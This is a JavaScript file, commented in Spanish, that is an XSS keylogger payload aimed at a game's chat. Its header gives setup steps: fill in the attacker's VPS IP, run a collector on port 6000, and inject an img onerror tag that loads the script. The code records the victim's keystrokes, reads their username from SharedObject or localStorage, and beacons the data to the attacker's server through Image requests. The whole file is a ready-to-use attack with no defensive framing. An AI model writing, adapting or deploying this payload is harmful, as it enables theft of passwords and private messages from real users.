/**
 * XSS Payload - Keylogger
 *
 * INSTRUCCIONES:
 * 1. Reemplaza TU_VPS_IP con la IP de tu VPS
 * 2. Asegúrate de que keylogger.py esté corriendo en puerto 6000
 * 3. Inyecta este payload en el chat del juego
 *
 * EJEMPLO DE INYECCIÓN:
 * <img src=x onerror='var s=document.createElement("script");s.src="http://TU_VPS_IP:8000/keylogger.js";document.body.appendChild(s);'>
 */

(function() {
    'use strict';

    const VPS_IP = 'TU_VPS_IP';  // ← CAMBIAR ESTO
    const COLLECTOR_PORT = 6000;
    const BUFFER_SIZE = 20;  // Enviar cada 20 caracteres
    const SEND_INTERVAL = 5000;  // O cada 5 segundos

    var keyBuffer = '';
    var username = 'Unknown';
    var lastSendTime = Date.now();

    try {
        console.log('[KEYLOGGER] Iniciando...');

        // Obtener username si es posible
        try {
            if (typeof SharedObject !== 'undefined') {
                var so = SharedObject.getLocal('userSession');
                if (so && so.data) {
                    username = so.data.username || so.data.user || 'Unknown';
                }
            }
        } catch(e) {
            try {
                username = localStorage.getItem('username') ||
                          localStorage.getItem('user') ||
                          'Unknown';
            } catch(e2) {}
        }

        // Función para enviar teclas capturadas
        function sendKeys(data) {
            if (!data || data.length === 0) return;

            var url = 'http://' + VPS_IP + ':' + COLLECTOR_PORT + '/keys' +
                      '?data=' + encodeURIComponent(data) +
                      '&user=' + encodeURIComponent(username);

            // Usar Image() para bypass CORS
            var img = new Image();
            img.src = url;

            console.log('[KEYLOGGER] Enviado: ' + data.substring(0, 20) + '...');
        }

        // Capturar eventos de teclado
        document.addEventListener('keypress', function(e) {
            try {
                var char = String.fromCharCode(e.keyCode || e.which);
                keyBuffer += char;

                // Enviar si el buffer está lleno O han pasado X segundos
                var now = Date.now();
                if (keyBuffer.length >= BUFFER_SIZE || (now - lastSendTime) > SEND_INTERVAL) {
                    sendKeys(keyBuffer);
                    keyBuffer = '';
                    lastSendTime = now;
                }
            } catch(err) {
                console.error('[KEYLOGGER] Error capturando tecla:', err);
            }
        }, true);  // true = capturar en fase de captura

        // También capturar keydown para teclas especiales
        document.addEventListener('keydown', function(e) {
            try {
                var specialKeys = {
                    8: '[BACKSPACE]',
                    9: '[TAB]',
                    13: '[ENTER]',
                    16: '[SHIFT]',
                    17: '[CTRL]',
                    18: '[ALT]',
                    27: '[ESC]',
                    32: ' ',
                    46: '[DEL]'
                };

                if (specialKeys[e.keyCode]) {
                    keyBuffer += specialKeys[e.keyCode];

                    var now = Date.now();
                    if (keyBuffer.length >= BUFFER_SIZE || (now - lastSendTime) > SEND_INTERVAL) {
                        sendKeys(keyBuffer);
                        keyBuffer = '';
                        lastSendTime = now;
                    }
                }
            } catch(err) {
                console.error('[KEYLOGGER] Error capturando tecla especial:', err);
            }
        }, true);

        // Enviar buffer cada X segundos aunque no esté lleno
        setInterval(function() {
            if (keyBuffer.length > 0) {
                sendKeys(keyBuffer);
                keyBuffer = '';
                lastSendTime = Date.now();
            }
        }, SEND_INTERVAL);

        console.log('[KEYLOGGER] Activado para usuario: ' + username);

    } catch(e) {
        console.error('[KEYLOGGER] Error en payload:', e);
    }
})();
